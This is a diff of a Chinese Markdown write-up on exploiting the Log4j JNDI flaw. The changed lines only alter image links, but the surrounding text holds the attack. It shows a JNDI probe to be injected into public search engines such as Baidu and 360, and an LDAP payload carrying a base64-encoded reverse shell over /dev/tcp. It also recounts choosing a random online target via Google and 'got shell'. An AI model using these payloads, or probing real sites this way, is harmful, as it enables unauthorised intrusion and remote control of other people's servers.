@@ -88,7 +88,7 @@ public class HelloSlf4j {
 
 重新加载i项目/生成源代码并更新文件，运行：calc
 
-![image-20211210201349137](https://s1.ax1x.com/2021/12/10/ooEx9H.png)
+![](https://s1.ax1x.com/2021/12/10/ooEx9H.png)
 
 高版本jdk需要开启 jndi
 
@@ -104,7 +104,7 @@ System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
 
 `${jndi:ldap://xxx.dnslog.cn/sec}` 扔baidu、360等直接搜索。
 
-![image-20211210202000250](https://s1.ax1x.com/2021/12/10/ooEOAO.png)
+![](https://s1.ax1x.com/2021/12/10/ooEOAO.png)
 
 ### Online getshell
 
@@ -125,11 +125,11 @@ ${jndi:ldap://8.8.8:8080/TomcatBypass/Command/Base64/c2ggLWkgPiYgL2Rldi90Y3AvOC4
 
 Google随机找个Online target
 
-![image-20211210203432384](https://s1.ax1x.com/2021/12/10/ooEqHK.png)
+![](https://s1.ax1x.com/2021/12/10/ooEqHK.png)
 
 got shell
 
-![image-20211210203720606](https://s1.ax1x.com/2021/12/10/ooEj4e.png)
+![](https://s1.ax1x.com/2021/12/10/ooEj4e.png)
 
 Bypass WAF？来源网上，没试过，不知可行否。
 
